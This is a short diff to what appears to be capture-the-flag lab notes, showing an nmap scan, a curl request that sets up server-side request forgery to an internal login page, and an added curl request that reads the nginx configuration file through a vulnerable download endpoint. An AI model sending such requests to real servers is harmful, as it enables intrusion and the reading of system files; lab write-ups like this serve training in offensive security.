@@ -199,3 +199,9 @@ nmap -p22,53,80 -sCV 10.129.150.83 -oN targeted
 ```
  curl --location 'http://10.10.11.224:55555/api/baskets/yesterday' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
 ```
+
+you can use the curl traffic to intercept
+
+```
+curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"
+```
